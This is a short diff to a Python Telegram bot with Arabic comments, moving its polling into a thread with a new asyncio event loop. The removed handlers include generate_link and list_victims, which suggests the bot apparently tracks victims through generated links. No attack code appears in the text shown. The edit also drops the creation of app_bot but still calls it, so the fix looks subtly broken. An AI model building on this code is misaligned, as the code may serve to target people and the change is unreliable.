@@ -243,12 +243,15 @@ async def stats(update, context):
     )
 
 # ========== تشغيل البوت في خلفية منفصلة ==========
+import asyncio
+
 def run_bot():
-    app_bot = Application.builder().token(TELEGRAM_TOKEN).build()
-    app_bot.add_handler(CommandHandler("start", start))
-    app_bot.add_handler(CommandHandler("link", generate_link))
-    app_bot.add_handler(CommandHandler("list", list_victims))
-    app_bot.add_handler(CommandHandler("stats", stats))
+    # 1. إنشاء event loop جديد للثريد الحالي
+    loop = asyncio.new_event_loop()
+    # 2. تعيين الـ loop الجديد كـ loop نشط في هذا الثريد
+    asyncio.set_event_loop(loop)
+    
+    # 3. تشغيل البوت الآن بدون مشاكل
     app_bot.run_polling()
 
 # ========== المدخل الرئيسي ==========
